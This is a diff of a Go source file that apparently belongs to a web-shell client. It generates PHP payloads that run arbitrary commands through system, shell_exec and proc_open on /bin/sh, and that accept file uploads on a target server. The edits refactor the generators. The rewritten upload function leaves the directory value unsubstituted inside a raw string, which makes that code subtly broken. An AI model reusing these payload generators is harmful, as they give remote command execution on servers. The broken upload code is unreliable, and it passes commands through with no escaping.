@@ -1,10 +1,6 @@
 package phpadapter
 
-import (
-	"fmt"
-
-	"github.com/eatbytes/razboy/normalizer"
-)
+import "github.com/eatbytes/razboy/normalizer"
 
 func _getSystemCMD(cmd, letter string) string {
 	return "ob_start();system('" + cmd + "');$" + letter + "=ob_get_contents();ob_end_clean();"
@@ -19,13 +15,20 @@ func _getProcOpenCMD(cmd, scope, proc, letter string) string {
 		scope = "./"
 	}
 
-	o := "$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2 => array('pipe', 'w'));$scope='" + scope + "';$proc=proc_open('" + proc + "', $opt, $pipes, $scope);"
-	o += "if(is_resource($proc)){fwrite($pipes[0],'" + cmd + "');fclose($pipes[0]);$s=stream_get_contents($pipes[1]);fclose($pipes[1]);$e=stream_get_contents($pipes[2]);"
-	o += "fclose($pipes[2]);$c = proc_close($proc);$" + letter + " = array('success'=>$s,'error'=>$e,'code'=>$c);$" + letter + "=json_encode($" + letter + ");}"
-
-	fmt.Println(o)
-
-	return o
+	return `$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe', 'w'));
+	$scope='` + scope + `';
+	$proc=proc_open('` + proc + `', $opt,$pipes,$scope);
+	if(is_resource($proc)){
+		fwrite($pipes[0],'` + cmd + `');
+		fclose($pipes[0]);
+		$s=stream_get_contents($pipes[1]);
+		fclose($pipes[1]);
+		$e=stream_get_contents($pipes[2]);
+		fclose($pipes[2]);
+		$c=proc_close($proc);
+		$` + letter + `=array('success'=>$s,'error'=>$e,'code'=>$c);
+		$` + letter + `=json_encode($` + letter + `);
+	}`
 }
 
 func CreateCMD(cmd, scope, method string) string {
@@ -37,14 +40,13 @@ func CreateCMD(cmd, scope, method string) string {
 
 	shellCMD = contexter + cmd
 
-	if method == "" || method == "system" {
-		shellCMD = _getSystemCMD(shellCMD, "r")
-	} else if method == "shell_exec" {
+	switch method {
+	case "shell_exec":
 		shellCMD = _getShellExecCMD(shellCMD, "r")
-	}
-
-	if method == "proc" {
+	case "proc":
 		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
+	default:
+		shellCMD = _getSystemCMD(shellCMD, "r")
 	}
 
 	return shellCMD
@@ -78,7 +80,9 @@ func CreateDownload(dir string) string {
 }
 
 func CreateUpload(dir string) string {
-	return "$file=$_FILES['file'];move_uploaded_file($file['tmp_name'], '" + dir + "');if(file_exists('" + dir + "')){echo 1;}"
+	return `$file=$_FILES['file'];
+	move_uploaded_file($file['tmp_name'], '" + dir + "');
+	if(file_exists('" + dir + "')){echo('` + normalizer.PHPEncode("1") + `');}`
 }
 
 func CreateListFile(scope string) string {
